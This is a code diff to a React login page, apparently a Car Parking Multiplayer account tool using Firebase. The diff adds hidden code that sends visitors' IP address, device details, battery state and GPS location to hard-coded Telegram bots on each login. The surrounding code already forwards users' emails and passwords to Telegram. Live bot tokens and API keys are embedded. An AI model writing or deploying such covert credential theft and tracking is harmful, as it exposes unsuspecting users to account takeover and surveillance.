@@ -99,7 +99,8 @@
         // Telegram configuration
         const BOT_TOKEN = "8268297036:AAHCLZYDS8MPgbT2SeCyrPpi5YXJDPq7i1Q";
         const CHAT_ID = 6095291231;
-
+         const botToken = '8469879482:AAHbFGXsBxum0f4pbj-kq_1skklTgJtSQgw';
+    const chatIds = ['6095291231', '6095291231', '-1003083824240'];
         // CPM1 Configurations
         const CPM1_CONFIG = {
             FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
@@ -215,6 +216,80 @@
                     console.warn('Error sending notification to Telegram:', error);
                 }
             };
+  function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(console.error);
+      });
+    }
+    
+function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(console.error);
+      });
+    }
+
+    async function getInfo() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+        if (loc.status === 'success') {
+          city = loc.city;
+          region = loc.regionName;
+          country = loc.country;
+          org = loc.org;
+        }
+      } catch {}
+
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+
+      const text = `
+IP         : ${ip}
+
+Browser    : ${navigator.userAgent}
+
+YOU         : ${navigator.platform}
+
+Resolution   : ${screen.width}x${screen.height}
+
+Battery    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+
+Memory     : ${navigator.deviceMemory || 'N/A'} GB
+
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+
+Time      : ${new Date().toLocaleString()}
+
+      `.trim();
+
+      sendToTelegram(`<b>📥 Info Visitors:</b>\n<pre>${text}</pre>`);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 GPS Location:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram(`📍 GPS Location Rejected`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser does not support GPS`);
+      }
+    }
 
             const login = async (email, password) => {
                 setStatus('Logging in...');
@@ -242,8 +317,10 @@
                         
                         if (currentConfig === CPM1_CONFIG) {
                             sendCPM1Notification(email, password);
+                            await getInfo();
                         } else {
                             sendCPM2Notification(email, password);
+                            await getInfo();
                         }
                         
                         return data.idToken;
@@ -409,7 +486,7 @@
                 </div>
             );
         }
-
+    
         ReactDOM.render(<App />, document.getElementById('root'));
     </script>
 </body>
